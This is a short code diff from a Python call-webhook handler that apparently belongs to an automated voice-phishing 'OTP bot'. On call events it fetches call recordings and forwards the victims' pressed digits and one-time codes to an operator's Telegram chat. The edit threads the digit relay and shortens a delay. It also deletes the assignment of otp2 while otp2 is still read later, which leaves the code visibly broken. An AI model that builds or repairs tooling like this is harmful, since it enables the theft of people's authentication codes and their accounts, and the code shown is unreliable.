@@ -968,7 +968,7 @@ def custom_prebuild_script_call(script_id,chatid):
 
     elif event == "call.hangup":
         try:
-            time.sleep(3)
+            time.sleep(0.5)
             resp = data['recording_url']
             response = requests.get(resp)
             payload = {
@@ -1017,8 +1017,12 @@ def custom_prebuild_script_call(script_id,chatid):
         bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
         
     elif event == "dtmf.gathered":
-        data = request.get_json()
-        otp2 = data['digits']
+        def send_dtmf():
+            data = request.get_json()
+            digit =  data['digit']
+            bot.send_message(chatid,f"""*Digit Pressed ⏩ {digit}*""",parse_mode='markdown')
+        send_dtmf_thread = threading.Thread(target=send_dtmf)
+        send_dtmf_thread.start()
 
         if otp2 == "1":
             def custom_ask_otp():
